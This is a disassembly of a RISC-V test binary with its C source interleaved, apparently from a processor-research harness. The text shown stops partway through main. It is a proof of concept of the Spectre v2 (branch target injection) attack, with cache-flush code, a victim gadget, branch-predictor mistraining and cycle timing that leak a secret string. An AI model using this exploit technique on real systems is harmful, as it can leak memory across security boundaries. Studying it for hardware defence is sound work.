
bin/spectre-v2.riscv：     文件格式 elf64-littleriscv


Disassembly of section .text.init:

0000000080000000 <_start>:
    80000000:	4081                	li	ra,0
    80000002:	4101                	li	sp,0
    80000004:	4181                	li	gp,0
    80000006:	4201                	li	tp,0
    80000008:	4281                	li	t0,0
    8000000a:	4301                	li	t1,0
    8000000c:	4381                	li	t2,0
    8000000e:	4401                	li	s0,0
    80000010:	4481                	li	s1,0
    80000012:	4501                	li	a0,0
    80000014:	4581                	li	a1,0
    80000016:	4601                	li	a2,0
    80000018:	4681                	li	a3,0
    8000001a:	4701                	li	a4,0
    8000001c:	4781                	li	a5,0
    8000001e:	4801                	li	a6,0
    80000020:	4881                	li	a7,0
    80000022:	4901                	li	s2,0
    80000024:	4981                	li	s3,0
    80000026:	4a01                	li	s4,0
    80000028:	4a81                	li	s5,0
    8000002a:	4b01                	li	s6,0
    8000002c:	4b81                	li	s7,0
    8000002e:	4c01                	li	s8,0
    80000030:	4c81                	li	s9,0
    80000032:	4d01                	li	s10,0
    80000034:	4d81                	li	s11,0
    80000036:	4e01                	li	t3,0
    80000038:	4e81                	li	t4,0
    8000003a:	4f01                	li	t5,0
    8000003c:	4f81                	li	t6,0
    8000003e:	62f9                	lui	t0,0x1e
    80000040:	3002a073          	csrs	mstatus,t0
    80000044:	4285                	li	t0,1
    80000046:	02fe                	slli	t0,t0,0x1f
    80000048:	0002d863          	bgez	t0,80000058 <_start+0x58>
    8000004c:	4505                	li	a0,1
    8000004e:	00001297          	auipc	t0,0x1
    80000052:	faa2a923          	sw	a0,-78(t0) # 80001000 <tohost>
    80000056:	bfdd                	j	8000004c <_start+0x4c>
    80000058:	00000297          	auipc	t0,0x0
    8000005c:	09028293          	addi	t0,t0,144 # 800000e8 <_start+0xe8>
    80000060:	30529073          	csrw	mtvec,t0
    80000064:	00301073          	fssr	zero
    80000068:	f0000053          	fmv.w.x	ft0,zero
    8000006c:	f00000d3          	fmv.w.x	ft1,zero
    80000070:	f0000153          	fmv.w.x	ft2,zero
    80000074:	f00001d3          	fmv.w.x	ft3,zero
    80000078:	f0000253          	fmv.w.x	ft4,zero
    8000007c:	f00002d3          	fmv.w.x	ft5,zero
    80000080:	f0000353          	fmv.w.x	ft6,zero
    80000084:	f00003d3          	fmv.w.x	ft7,zero
    80000088:	f0000453          	fmv.w.x	fs0,zero
    8000008c:	f00004d3          	fmv.w.x	fs1,zero
    80000090:	f0000553          	fmv.w.x	fa0,zero
    80000094:	f00005d3          	fmv.w.x	fa1,zero
    80000098:	f0000653          	fmv.w.x	fa2,zero
    8000009c:	f00006d3          	fmv.w.x	fa3,zero
    800000a0:	f0000753          	fmv.w.x	fa4,zero
    800000a4:	f00007d3          	fmv.w.x	fa5,zero
    800000a8:	f0000853          	fmv.w.x	fa6,zero
    800000ac:	f00008d3          	fmv.w.x	fa7,zero
    800000b0:	f0000953          	fmv.w.x	fs2,zero
    800000b4:	f00009d3          	fmv.w.x	fs3,zero
    800000b8:	f0000a53          	fmv.w.x	fs4,zero
    800000bc:	f0000ad3          	fmv.w.x	fs5,zero
    800000c0:	f0000b53          	fmv.w.x	fs6,zero
    800000c4:	f0000bd3          	fmv.w.x	fs7,zero
    800000c8:	f0000c53          	fmv.w.x	fs8,zero
    800000cc:	f0000cd3          	fmv.w.x	fs9,zero
    800000d0:	f0000d53          	fmv.w.x	fs10,zero
    800000d4:	f0000dd3          	fmv.w.x	fs11,zero
    800000d8:	f0000e53          	fmv.w.x	ft8,zero
    800000dc:	f0000ed3          	fmv.w.x	ft9,zero
    800000e0:	f0000f53          	fmv.w.x	ft10,zero
    800000e4:	f0000fd3          	fmv.w.x	ft11,zero
    800000e8:	00000297          	auipc	t0,0x0
    800000ec:	03c28293          	addi	t0,t0,60 # 80000124 <trap_entry>
    800000f0:	30529073          	csrw	mtvec,t0
    800000f4:	00003197          	auipc	gp,0x3
    800000f8:	2ec18193          	addi	gp,gp,748 # 800033e0 <__global_pointer$>
    800000fc:	0001b217          	auipc	tp,0x1b
    80000100:	40320213          	addi	tp,tp,1027 # 8001b4ff <_end+0x3f>
    80000104:	fc027213          	andi	tp,tp,-64
    80000108:	f1402573          	csrr	a0,mhartid
    8000010c:	4585                	li	a1,1
    8000010e:	00b57063          	bleu	a1,a0,8000010e <_start+0x10e>
    80000112:	01151613          	slli	a2,a0,0x11
    80000116:	9232                	add	tp,tp,a2
    80000118:	00150113          	addi	sp,a0,1
    8000011c:	0146                	slli	sp,sp,0x11
    8000011e:	9112                	add	sp,sp,tp
    80000120:	2ef0106f          	j	80001c0e <_init>

0000000080000124 <trap_entry>:
    80000124:	716d                	addi	sp,sp,-272
    80000126:	e406                	sd	ra,8(sp)
    80000128:	e80a                	sd	sp,16(sp)
    8000012a:	ec0e                	sd	gp,24(sp)
    8000012c:	f012                	sd	tp,32(sp)
    8000012e:	f416                	sd	t0,40(sp)
    80000130:	f81a                	sd	t1,48(sp)
    80000132:	fc1e                	sd	t2,56(sp)
    80000134:	e0a2                	sd	s0,64(sp)
    80000136:	e4a6                	sd	s1,72(sp)
    80000138:	e8aa                	sd	a0,80(sp)
    8000013a:	ecae                	sd	a1,88(sp)
    8000013c:	f0b2                	sd	a2,96(sp)
    8000013e:	f4b6                	sd	a3,104(sp)
    80000140:	f8ba                	sd	a4,112(sp)
    80000142:	fcbe                	sd	a5,120(sp)
    80000144:	e142                	sd	a6,128(sp)
    80000146:	e546                	sd	a7,136(sp)
    80000148:	e94a                	sd	s2,144(sp)
    8000014a:	ed4e                	sd	s3,152(sp)
    8000014c:	f152                	sd	s4,160(sp)
    8000014e:	f556                	sd	s5,168(sp)
    80000150:	f95a                	sd	s6,176(sp)
    80000152:	fd5e                	sd	s7,184(sp)
    80000154:	e1e2                	sd	s8,192(sp)
    80000156:	e5e6                	sd	s9,200(sp)
    80000158:	e9ea                	sd	s10,208(sp)
    8000015a:	edee                	sd	s11,216(sp)
    8000015c:	f1f2                	sd	t3,224(sp)
    8000015e:	f5f6                	sd	t4,232(sp)
    80000160:	f9fa                	sd	t5,240(sp)
    80000162:	fdfe                	sd	t6,248(sp)
    80000164:	34202573          	csrr	a0,mcause
    80000168:	341025f3          	csrr	a1,mepc
    8000016c:	860a                	mv	a2,sp
    8000016e:	17d010ef          	jal	ra,80001aea <handle_trap>
    80000172:	34151073          	csrw	mepc,a0
    80000176:	000022b7          	lui	t0,0x2
    8000017a:	8002829b          	addiw	t0,t0,-2048
    8000017e:	3002a073          	csrs	mstatus,t0
    80000182:	60a2                	ld	ra,8(sp)
    80000184:	6142                	ld	sp,16(sp)
    80000186:	61e2                	ld	gp,24(sp)
    80000188:	7202                	ld	tp,32(sp)
    8000018a:	72a2                	ld	t0,40(sp)
    8000018c:	7342                	ld	t1,48(sp)
    8000018e:	73e2                	ld	t2,56(sp)
    80000190:	6406                	ld	s0,64(sp)
    80000192:	64a6                	ld	s1,72(sp)
    80000194:	6546                	ld	a0,80(sp)
    80000196:	65e6                	ld	a1,88(sp)
    80000198:	7606                	ld	a2,96(sp)
    8000019a:	76a6                	ld	a3,104(sp)
    8000019c:	7746                	ld	a4,112(sp)
    8000019e:	77e6                	ld	a5,120(sp)
    800001a0:	680a                	ld	a6,128(sp)
    800001a2:	68aa                	ld	a7,136(sp)
    800001a4:	694a                	ld	s2,144(sp)
    800001a6:	69ea                	ld	s3,152(sp)
    800001a8:	7a0a                	ld	s4,160(sp)
    800001aa:	7aaa                	ld	s5,168(sp)
    800001ac:	7b4a                	ld	s6,176(sp)
    800001ae:	7bea                	ld	s7,184(sp)
    800001b0:	6c0e                	ld	s8,192(sp)
    800001b2:	6cae                	ld	s9,200(sp)
    800001b4:	6d4e                	ld	s10,208(sp)
    800001b6:	6dee                	ld	s11,216(sp)
    800001b8:	7e0e                	ld	t3,224(sp)
    800001ba:	7eae                	ld	t4,232(sp)
    800001bc:	7f4e                	ld	t5,240(sp)
    800001be:	7fee                	ld	t6,248(sp)
    800001c0:	6151                	addi	sp,sp,272
    800001c2:	30200073          	mret

Disassembly of section .tohost:

0000000080001000 <tohost>:
	...

0000000080001040 <fromhost>:
	...

Disassembly of section .text:

0000000080001048 <flushCache>:
 *
 * @param addr starting address to clear the cache
 * @param sz size of the data to remove in bytes
 */
void flushCache(uint64_t addr, uint64_t sz)
{
    80001048:	711d                	addi	sp,sp,-96
    8000104a:	eca2                	sd	s0,88(sp)
    8000104c:	1080                	addi	s0,sp,96
    8000104e:	faa43423          	sd	a0,-88(s0)
    80001052:	fab43023          	sd	a1,-96(s0)
    // printf("Flushed addr(0x%lx) tag(0x%lx) set(0x%lx) off(0x%lx) sz(%ld)\n", addr, (addr & TAG_MASK) >> (L1_SET_BITS + L1_BLOCK_BITS), 
    //                                                                    (addr & SET_MASK) >> L1_BLOCK_BITS, addr & OFF_MASK, sz);

    // find out the amount of blocks you want to clear
    uint64_t numSetsClear = sz >> L1_BLOCK_BITS;
    80001056:	fa043783          	ld	a5,-96(s0)
    8000105a:	8399                	srli	a5,a5,0x6
    8000105c:	fef43423          	sd	a5,-24(s0)
    if ((sz & OFF_MASK) != 0)
    80001060:	fa043783          	ld	a5,-96(s0)
    80001064:	03f7f793          	andi	a5,a5,63
    80001068:	c791                	beqz	a5,80001074 <flushCache+0x2c>
    {
        numSetsClear += 1;
    8000106a:	fe843783          	ld	a5,-24(s0)
    8000106e:	0785                	addi	a5,a5,1
    80001070:	fef43423          	sd	a5,-24(s0)
    }

    if (numSetsClear > L1_SETS)
    80001074:	fe843703          	ld	a4,-24(s0)
    80001078:	04000793          	li	a5,64
    8000107c:	00e7f663          	bleu	a4,a5,80001088 <flushCache+0x40>
    {
        // flush entire cache with no rollover (makes the function finish faster) 
        numSetsClear = L1_SETS;
    80001080:	04000793          	li	a5,64
    80001084:	fef43423          	sd	a5,-24(s0)
    }
    
    //printf("numSetsClear(%ld)\n", numSetsClear);

    // temp variable used for nothing
    uint8_t dummy = 0;
    80001088:	fc040ba3          	sb	zero,-41(s0)

    // this mem address is the start of a contiguous set of memory that will fit inside of the cache
    // thus it has the following properties
    // 1. dummyMem <= alignedMem < dummyMem + sizeof(dummyMem)
    // 2. alignedMem has idx = 0 and offset = 0 
    uint64_t alignedMem = (((uint64_t)dummyMem) + L1_SZ_BYTES) & TAG_MASK;
    8000108c:	00002717          	auipc	a4,0x2
    80001090:	b7470713          	addi	a4,a4,-1164 # 80002c00 <dummyMem>
    80001094:	6791                	lui	a5,0x4
    80001096:	973e                	add	a4,a4,a5
    80001098:	77fd                	lui	a5,0xfffff
    8000109a:	8ff9                	and	a5,a5,a4
    8000109c:	fcf43423          	sd	a5,-56(s0)
    //printf("alignedMem(0x%lx)\n", alignedMem);
        
    for (uint64_t i = 0; i < numSetsClear; ++i)
    800010a0:	fe043023          	sd	zero,-32(s0)
    800010a4:	a8b9                	j	80001102 <flushCache+0xba>
    {
        // offset to move across the sets that you want to flush
        uint64_t setOffset = (((addr & SET_MASK) >> L1_BLOCK_BITS) + i) << L1_BLOCK_BITS;
    800010a6:	fa843783          	ld	a5,-88(s0)
    800010aa:	8399                	srli	a5,a5,0x6
    800010ac:	03f7f713          	andi	a4,a5,63
    800010b0:	fe043783          	ld	a5,-32(s0)
    800010b4:	97ba                	add	a5,a5,a4
    800010b6:	079a                	slli	a5,a5,0x6
    800010b8:	fcf43023          	sd	a5,-64(s0)
        //printf("setOffset(0x%lx)\n", setOffset);

        // since there are L1_WAYS you need to flush the entire set
        for(uint64_t j = 0; j < 4*L1_WAYS; ++j)   //j < 4*L1_WAYS
    800010bc:	fc043c23          	sd	zero,-40(s0)
    800010c0:	a03d                	j	800010ee <flushCache+0xa6>
        {
            // offset to reaccess the set
            uint64_t wayOffset = j << (L1_BLOCK_BITS + L1_SET_BITS);
    800010c2:	fd843783          	ld	a5,-40(s0)
    800010c6:	07b2                	slli	a5,a5,0xc
    800010c8:	faf43c23          	sd	a5,-72(s0)
            //printf("wayOffset(0x%lx)\n", wayOffset);

            // evict the previous cache block and put in the dummy mem
            dummy = *((uint8_t*)(alignedMem + setOffset + wayOffset));
    800010cc:	fc843703          	ld	a4,-56(s0)
    800010d0:	fc043783          	ld	a5,-64(s0)
    800010d4:	973e                	add	a4,a4,a5
    800010d6:	fb843783          	ld	a5,-72(s0)
    800010da:	97ba                	add	a5,a5,a4
    800010dc:	0007c783          	lbu	a5,0(a5) # fffffffffffff000 <_end+0xffffffff7ffe3b40>
    800010e0:	fcf40ba3          	sb	a5,-41(s0)
        for(uint64_t j = 0; j < 4*L1_WAYS; ++j)   //j < 4*L1_WAYS
    800010e4:	fd843783          	ld	a5,-40(s0)
    800010e8:	0785                	addi	a5,a5,1
    800010ea:	fcf43c23          	sd	a5,-40(s0)
    800010ee:	fd843703          	ld	a4,-40(s0)
    800010f2:	47bd                	li	a5,15
    800010f4:	fce7f7e3          	bleu	a4,a5,800010c2 <flushCache+0x7a>
    for (uint64_t i = 0; i < numSetsClear; ++i)
    800010f8:	fe043783          	ld	a5,-32(s0)
    800010fc:	0785                	addi	a5,a5,1
    800010fe:	fef43023          	sd	a5,-32(s0)
    80001102:	fe043703          	ld	a4,-32(s0)
    80001106:	fe843783          	ld	a5,-24(s0)
    8000110a:	f8f76ee3          	bltu	a4,a5,800010a6 <flushCache+0x5e>
            //printf("evict read(0x%lx)\n", alignedMem + setOffset + wayOffset);
        }
    }
}
    8000110e:	0001                	nop
    80001110:	6466                	ld	s0,88(sp)
    80001112:	6125                	addi	sp,sp,96
    80001114:	8082                	ret

0000000080001116 <topTwoIdx>:
 * @input inArraySize size of the inArray array in entries
 * @inout outIdxArray array holding the idxs of the top two values
 *        ([0] idx has the larger value in inArray array)
 * @inout outValArray array holding the top two values ([0] has the larger value)
 */
void topTwoIdx(uint64_t* inArray, uint64_t inArraySize, uint8_t* outIdxArray, uint64_t* outValArray){
    80001116:	7139                	addi	sp,sp,-64
    80001118:	fc22                	sd	s0,56(sp)
    8000111a:	0080                	addi	s0,sp,64
    8000111c:	fca43c23          	sd	a0,-40(s0)
    80001120:	fcb43823          	sd	a1,-48(s0)
    80001124:	fcc43423          	sd	a2,-56(s0)
    80001128:	fcd43023          	sd	a3,-64(s0)
    outValArray[0] = 0;
    8000112c:	fc043783          	ld	a5,-64(s0)
    80001130:	0007b023          	sd	zero,0(a5)
    outValArray[1] = 0;
    80001134:	fc043783          	ld	a5,-64(s0)
    80001138:	07a1                	addi	a5,a5,8
    8000113a:	0007b023          	sd	zero,0(a5)

    for (uint64_t i = 0; i < inArraySize; ++i){
    8000113e:	fe043423          	sd	zero,-24(s0)
    80001142:	a075                	j	800011ee <topTwoIdx+0xd8>
        if (inArray[i] > outValArray[0]){
    80001144:	fe843783          	ld	a5,-24(s0)
    80001148:	078e                	slli	a5,a5,0x3
    8000114a:	fd843703          	ld	a4,-40(s0)
    8000114e:	97ba                	add	a5,a5,a4
    80001150:	6398                	ld	a4,0(a5)
    80001152:	fc043783          	ld	a5,-64(s0)
    80001156:	639c                	ld	a5,0(a5)
    80001158:	04e7f563          	bleu	a4,a5,800011a2 <topTwoIdx+0x8c>
            outValArray[1] = outValArray[0];
    8000115c:	fc043783          	ld	a5,-64(s0)
    80001160:	07a1                	addi	a5,a5,8
    80001162:	fc043703          	ld	a4,-64(s0)
    80001166:	6318                	ld	a4,0(a4)
    80001168:	e398                	sd	a4,0(a5)
            outValArray[0] = inArray[i];
    8000116a:	fe843783          	ld	a5,-24(s0)
    8000116e:	078e                	slli	a5,a5,0x3
    80001170:	fd843703          	ld	a4,-40(s0)
    80001174:	97ba                	add	a5,a5,a4
    80001176:	6398                	ld	a4,0(a5)
    80001178:	fc043783          	ld	a5,-64(s0)
    8000117c:	e398                	sd	a4,0(a5)
            outIdxArray[1] = outIdxArray[0];
    8000117e:	fc843783          	ld	a5,-56(s0)
    80001182:	0785                	addi	a5,a5,1
    80001184:	fc843703          	ld	a4,-56(s0)
    80001188:	00074703          	lbu	a4,0(a4)
    8000118c:	00e78023          	sb	a4,0(a5)
            outIdxArray[0] = i;
    80001190:	fe843783          	ld	a5,-24(s0)
    80001194:	0ff7f713          	andi	a4,a5,255
    80001198:	fc843783          	ld	a5,-56(s0)
    8000119c:	00e78023          	sb	a4,0(a5)
    800011a0:	a091                	j	800011e4 <topTwoIdx+0xce>
        }
        else if (inArray[i] > outValArray[1]){
    800011a2:	fe843783          	ld	a5,-24(s0)
    800011a6:	078e                	slli	a5,a5,0x3
    800011a8:	fd843703          	ld	a4,-40(s0)
    800011ac:	97ba                	add	a5,a5,a4
    800011ae:	6398                	ld	a4,0(a5)
    800011b0:	fc043783          	ld	a5,-64(s0)
    800011b4:	07a1                	addi	a5,a5,8
    800011b6:	639c                	ld	a5,0(a5)
    800011b8:	02e7f663          	bleu	a4,a5,800011e4 <topTwoIdx+0xce>
            outValArray[1] = inArray[i];
    800011bc:	fe843783          	ld	a5,-24(s0)
    800011c0:	078e                	slli	a5,a5,0x3
    800011c2:	fd843703          	ld	a4,-40(s0)
    800011c6:	973e                	add	a4,a4,a5
    800011c8:	fc043783          	ld	a5,-64(s0)
    800011cc:	07a1                	addi	a5,a5,8
    800011ce:	6318                	ld	a4,0(a4)
    800011d0:	e398                	sd	a4,0(a5)
            outIdxArray[1] = i;
    800011d2:	fc843783          	ld	a5,-56(s0)
    800011d6:	0785                	addi	a5,a5,1
    800011d8:	fe843703          	ld	a4,-24(s0)
    800011dc:	0ff77713          	andi	a4,a4,255
    800011e0:	00e78023          	sb	a4,0(a5)
    for (uint64_t i = 0; i < inArraySize; ++i){
    800011e4:	fe843783          	ld	a5,-24(s0)
    800011e8:	0785                	addi	a5,a5,1
    800011ea:	fef43423          	sd	a5,-24(s0)
    800011ee:	fe843703          	ld	a4,-24(s0)
    800011f2:	fd043783          	ld	a5,-48(s0)
    800011f6:	f4f767e3          	bltu	a4,a5,80001144 <topTwoIdx+0x2e>
        }
    }
}
    800011fa:	0001                	nop
    800011fc:	7462                	ld	s0,56(sp)
    800011fe:	6121                	addi	sp,sp,64
    80001200:	8082                	ret

0000000080001202 <wantFunc>:

/**
 * on the victim run this should be the function that should run. what should happen is that during the attack run
 * the victimFunc should run speculatively (it is the gadget) then the wantFunc should run
 */
void wantFunc(){
    80001202:	1141                	addi	sp,sp,-16
    80001204:	e422                	sd	s0,8(sp)
    80001206:	0800                	addi	s0,sp,16
    asm("nop");
    80001208:	0001                	nop
}
    8000120a:	0001                	nop
    8000120c:	6422                	ld	s0,8(sp)
    8000120e:	0141                	addi	sp,sp,16
    80001210:	8082                	ret

0000000080001212 <victimFunc>:
 * takes in an idx to use to access a secret array. this idx is used to read any mem addr outside
 * the bounds of the array through the Spectre Variant 1 attack.
 *
 * @input idx input to be used to idx the array
 */
void victimFunc(uint64_t idx){
    80001212:	7179                	addi	sp,sp,-48
    80001214:	f422                	sd	s0,40(sp)
    80001216:	1800                	addi	s0,sp,48
    80001218:	fca43c23          	sd	a0,-40(s0)
    uint8_t dummy = array2[array1[idx] * L1_BLOCK_SZ_BYTES];
    8000121c:	00002717          	auipc	a4,0x2
    80001220:	92470713          	addi	a4,a4,-1756 # 80002b40 <array1>
    80001224:	fd843783          	ld	a5,-40(s0)
    80001228:	97ba                	add	a5,a5,a4
    8000122a:	0007c783          	lbu	a5,0(a5)
    8000122e:	2781                	sext.w	a5,a5
    80001230:	0067979b          	slliw	a5,a5,0x6
    80001234:	2781                	sext.w	a5,a5
    80001236:	00016717          	auipc	a4,0x16
    8000123a:	a4a70713          	addi	a4,a4,-1462 # 80016c80 <array2>
    8000123e:	97ba                	add	a5,a5,a4
    80001240:	0007c783          	lbu	a5,0(a5)
    80001244:	fef407a3          	sb	a5,-17(s0)
}
    80001248:	0001                	nop
    8000124a:	7422                	ld	s0,40(sp)
    8000124c:	6145                	addi	sp,sp,48
    8000124e:	8082                	ret

0000000080001250 <main>:

int main(void){
    80001250:	7131                	addi	sp,sp,-192
    80001252:	fd06                	sd	ra,184(sp)
    80001254:	f922                	sd	s0,176(sp)
    80001256:	0180                	addi	s0,sp,192
    uint64_t wantAddr = (uint64_t)(&wantFunc); 
    80001258:	00000797          	auipc	a5,0x0
    8000125c:	faa78793          	addi	a5,a5,-86 # 80001202 <wantFunc>
    80001260:	faf43423          	sd	a5,-88(s0)
    uint64_t victimAddr = (uint64_t)(&victimFunc);
    80001264:	00000797          	auipc	a5,0x0
    80001268:	fae78793          	addi	a5,a5,-82 # 80001212 <victimFunc>
    8000126c:	faf43023          	sd	a5,-96(s0)
    uint64_t start, diff, passInAddr;
    uint64_t attackIdx = (uint64_t)(secretString - (char*)array1);
    80001270:	00002797          	auipc	a5,0x2
    80001274:	97878793          	addi	a5,a5,-1672 # 80002be8 <secretString>
    80001278:	639c                	ld	a5,0(a5)
    8000127a:	873e                	mv	a4,a5
    8000127c:	00002797          	auipc	a5,0x2
    80001280:	8c478793          	addi	a5,a5,-1852 # 80002b40 <array1>
    80001284:	40f707b3          	sub	a5,a4,a5
    80001288:	fef43423          	sd	a5,-24(s0)
    uint64_t passInIdx, randIdx;
    uint8_t dummy = 0;
    8000128c:	fe0403a3          	sb	zero,-25(s0)
    static uint64_t results[256];

    printf("================= This is a POC of spectre_v2 (Branch Target Injection) ========================= \n");
    80001290:	00001517          	auipc	a0,0x1
    80001294:	5c050513          	addi	a0,a0,1472 # 80002850 <atol+0x100>
    80001298:	090010ef          	jal	ra,80002328 <printf>
    printf("the secret key is:%s \n", secretString);
    8000129c:	00002797          	auipc	a5,0x2
    800012a0:	94c78793          	addi	a5,a5,-1716 # 80002be8 <secretString>
    800012a4:	639c                	ld	a5,0(a5)
    800012a6:	85be                	mv	a1,a5
    800012a8:	00001517          	auipc	a0,0x1
    800012ac:	61050513          	addi	a0,a0,1552 # 800028b8 <atol+0x168>
    800012b0:	078010ef          	jal	ra,80002328 <printf>

    // try to read out the secret
    for(uint64_t len = 0; len < SECRET_SZ; ++len){
    800012b4:	fc043c23          	sd	zero,-40(s0)
    800012b8:	ae31                	j	800015d4 <main+0x384>

        // clear results every round
        for(uint64_t cIdx = 0; cIdx < 256; ++cIdx){
    800012ba:	fc043823          	sd	zero,-48(s0)
    800012be:	a005                	j	800012de <main+0x8e>
            results[cIdx] = 0;
    800012c0:	0001a717          	auipc	a4,0x1a
    800012c4:	9c070713          	addi	a4,a4,-1600 # 8001ac80 <results.2502>
    800012c8:	fd043783          	ld	a5,-48(s0)
    800012cc:	078e                	slli	a5,a5,0x3
    800012ce:	97ba                	add	a5,a5,a4
    800012d0:	0007b023          	sd	zero,0(a5)
        for(uint64_t cIdx = 0; cIdx < 256; ++cIdx){
    800012d4:	fd043783          	ld	a5,-48(s0)
    800012d8:	0785                	addi	a5,a5,1
    800012da:	fcf43823          	sd	a5,-48(s0)
    800012de:	fd043703          	ld	a4,-48(s0)
    800012e2:	0ff00793          	li	a5,255
    800012e6:	fce7fde3          	bleu	a4,a5,800012c0 <main+0x70>
        }

        // run the attack on the same idx ATTACK_SAME_ROUNDS times
        for(uint64_t atkRound = 0; atkRound < ATTACK_SAME_ROUNDS; ++atkRound){
    800012ea:	fc043423          	sd	zero,-56(s0)
    800012ee:	aa4d                	j	800014a0 <main+0x250>

            // make sure array you read from is not in the cache
            flushCache((uint64_t)array2, sizeof(array2));
    800012f0:	00016797          	auipc	a5,0x16
    800012f4:	99078793          	addi	a5,a5,-1648 # 80016c80 <array2>
    800012f8:	6591                	lui	a1,0x4
    800012fa:	853e                	mv	a0,a5
    800012fc:	d4dff0ef          	jal	ra,80001048 <flushCache>

            for(int64_t j = ((TRAIN_TIMES+1)*ROUNDS)-1; j >= 0; --j){
    80001300:	4799                	li	a5,6
    80001302:	fcf43023          	sd	a5,-64(s0)
    80001306:	a8cd                	j	800013f8 <main+0x1a8>
                // bit twiddling to set (passInAddr, passInIdx)=(victimAddr, randIdx) or (wantAddr, attackIdx) after TRAIN_TIMES iterations
                // avoid jumps in case those tip off the branch predictor
                // note: randIdx changes everytime the atkRound changes so that the tally does not get affected
                //       training creates a false hit in array2 for that array1 value (you want this to be ignored by having it changed)
                passInAddr = ((j % (TRAIN_TIMES+1)) - 1) & ~0xFFFF; // after every TRAIN_TIMES set passInAddr=...FFFF0000 else 0
    80001308:	fc043703          	ld	a4,-64(s0)
    8000130c:	479d                	li	a5,7
    8000130e:	02f767b3          	rem	a5,a4,a5
    80001312:	17fd                	addi	a5,a5,-1
    80001314:	873e                	mv	a4,a5
    80001316:	77c1                	lui	a5,0xffff0
    80001318:	8ff9                	and	a5,a5,a4
    8000131a:	f6f43c23          	sd	a5,-136(s0)
                passInAddr = (passInAddr | (passInAddr >> 16)); // set the passInAddr=-1 or 0
    8000131e:	f7843783          	ld	a5,-136(s0)
    80001322:	83c1                	srli	a5,a5,0x10
    80001324:	f7843703          	ld	a4,-136(s0)
    80001328:	8fd9                	or	a5,a5,a4
    8000132a:	f6f43c23          	sd	a5,-136(s0)
                passInAddr = victimAddr ^ (passInAddr & (wantAddr ^ victimAddr)); // select victimAddr or wantAddr 
    8000132e:	fa843703          	ld	a4,-88(s0)
    80001332:	fa043783          	ld	a5,-96(s0)
    80001336:	8f3d                	xor	a4,a4,a5
    80001338:	f7843783          	ld	a5,-136(s0)
    8000133c:	8ff9                	and	a5,a5,a4
    8000133e:	fa043703          	ld	a4,-96(s0)
    80001342:	8fb9                	xor	a5,a5,a4
    80001344:	f6f43c23          	sd	a5,-136(s0)

                randIdx = atkRound % array1_sz;
    80001348:	00002797          	auipc	a5,0x2
    8000134c:	89878793          	addi	a5,a5,-1896 # 80002be0 <array1_sz>
    80001350:	639c                	ld	a5,0(a5)
    80001352:	fc843703          	ld	a4,-56(s0)
    80001356:	02f777b3          	remu	a5,a4,a5
    8000135a:	f6f43823          	sd	a5,-144(s0)
                passInIdx = ((j % (TRAIN_TIMES+1)) - 1) & ~0xFFFF; // after every TRAIN_TIMES set passInIdx=...FFFF0000 else 0
    8000135e:	fc043703          	ld	a4,-64(s0)
    80001362:	479d                	li	a5,7
    80001364:	02f767b3          	rem	a5,a4,a5
    80001368:	17fd                	addi	a5,a5,-1
    8000136a:	873e                	mv	a4,a5
    8000136c:	77c1                	lui	a5,0xffff0
    8000136e:	8ff9                	and	a5,a5,a4
    80001370:	f6f43423          	sd	a5,-152(s0)
                passInIdx = (passInIdx | (passInIdx >> 16)); // set the passInIdx=-1 or 0
    80001374:	f6843783          	ld	a5,-152(s0)
    80001378:	83c1                	srli	a5,a5,0x10
    8000137a:	f6843703          	ld	a4,-152(s0)
    8000137e:	8fd9                	or	a5,a5,a4
    80001380:	f6f43423          	sd	a5,-152(s0)
                passInIdx = randIdx ^ (passInIdx & (attackIdx ^ randIdx)); // select randIdx or attackIdx 
    80001384:	fe843703          	ld	a4,-24(s0)
    80001388:	f7043783          	ld	a5,-144(s0)
    8000138c:	8f3d                	xor	a4,a4,a5
    8000138e:	f6843783          	ld	a5,-152(s0)
    80001392:	8ff9                	and	a5,a5,a4
    80001394:	f7043703          	ld	a4,-144(s0)
    80001398:	8fb9                	xor	a5,a5,a4
    8000139a:	f6f43423          	sd	a5,-152(s0)

                // set of constant takens to make the BHR be in a all taken state
                for(uint64_t k = 0; k < 30; ++k){
    8000139e:	fa043c23          	sd	zero,-72(s0)
    800013a2:	a031                	j	800013ae <main+0x15e>
    800013a4:	fb843783          	ld	a5,-72(s0)
    800013a8:	0785                	addi	a5,a5,1
    800013aa:	faf43c23          	sd	a5,-72(s0)
    800013ae:	fb843703          	ld	a4,-72(s0)
    800013b2:	47f5                	li	a5,29
    800013b4:	fee7f8e3          	bleu	a4,a5,800013a4 <main+0x154>
                    asm("");
                }

                // this calls the function using jalr and delays the addr passed in through fdiv
                asm("addi %[addr], %[addr], -2\n"
    800013b8:	f7843783          	ld	a5,-136(s0)
    800013bc:	f6843703          	ld	a4,-152(s0)
    800013c0:	17f9                	addi	a5,a5,-2
    800013c2:	00200313          	li	t1,2
    800013c6:	00431393          	slli	t2,t1,0x4
    800013ca:	d0337753          	fcvt.s.lu	fa4,t1
    800013ce:	d033f7d3          	fcvt.s.lu	fa5,t2
    800013d2:	18e7f7d3          	fdiv.s	fa5,fa5,fa4
    800013d6:	18e7f7d3          	fdiv.s	fa5,fa5,fa4
    800013da:	18e7f7d3          	fdiv.s	fa5,fa5,fa4
    800013de:	18e7f7d3          	fdiv.s	fa5,fa5,fa4
    800013e2:	c03793d3          	fcvt.lu.s	t2,fa5,rtz
    800013e6:	979e                	add	a5,a5,t2
    800013e8:	853a                	mv	a0,a4
    800013ea:	000780e7          	jalr	a5
            for(int64_t j = ((TRAIN_TIMES+1)*ROUNDS)-1; j >= 0; --j){
    800013ee:	fc043783          	ld	a5,-64(s0)
    800013f2:	17fd                	addi	a5,a5,-1
    800013f4:	fcf43023          	sd	a5,-64(s0)
    800013f8:	fc043783          	ld	a5,-64(s0)
    800013fc:	f007d6e3          	bgez	a5,80001308 <main+0xb8>
                    : "t1", "t2", "fa4", "fa5");
            }
            
            // read out array 2 and see the hit secret value
            // this is also assuming there is no prefetching
            for (uint64_t i = 0; i < 256; ++i){
    80001400:	fa043823          	sd	zero,-80(s0)
    80001404:	a059                	j	8000148a <main+0x23a>
                start = rdcycle();
    80001406:	c00027f3          	rdcycle	a5
    8000140a:	f8f43c23          	sd	a5,-104(s0)
    8000140e:	f9843783          	ld	a5,-104(s0)
    80001412:	f8f43823          	sd	a5,-112(s0)
                dummy &= array2[i * L1_BLOCK_SZ_BYTES];
    80001416:	fb043783          	ld	a5,-80(s0)
    8000141a:	079a                	slli	a5,a5,0x6
    8000141c:	00016717          	auipc	a4,0x16
    80001420:	86470713          	addi	a4,a4,-1948 # 80016c80 <array2>
    80001424:	97ba                	add	a5,a5,a4
